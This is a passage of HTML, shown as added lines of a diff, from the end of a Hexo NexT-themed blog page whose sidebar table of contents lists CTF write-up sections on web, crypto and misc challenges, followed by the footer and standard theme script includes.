+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Glarcy">
+            
+              <p class="site-author-name" itemprop="name">Glarcy</p>
+              <p class="site-description motion-element" itemprop="description">web小菜鸡</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">42</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://aluvion.github.io/" title="Twings" target="_blank">Twings</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://xi4or0uji.github.io/" title="Xi4or0uji" target="_blank">Xi4or0uji</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://23r3f.github.io/" title="23R3F" target="_blank">23R3F</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://zszcr.github.io/" title="zs0zrc" target="_blank">zs0zrc</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web"><span class="nav-number">2.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Ticket-System"><span class="nav-number">2.1.</span> <span class="nav-text">Ticket_System</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Crypto"><span class="nav-number">3.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Broadcast"><span class="nav-number">3.1.</span> <span class="nav-text">Broadcast</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Related"><span class="nav-number">3.2.</span> <span class="nav-text">Related</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#精明的Alice"><span class="nav-number">3.3.</span> <span class="nav-text">精明的Alice</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Misc"><span class="nav-number">4.</span> <span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#签到"><span class="nav-number">4.1.</span> <span class="nav-text">签到</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Advertising-for-Marriage"><span class="nav-number">4.2.</span> <span class="nav-text">Advertising for Marriage</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#恶臭的数据包"><span class="nav-number">4.3.</span> <span class="nav-text">恶臭的数据包</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Glarcy</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
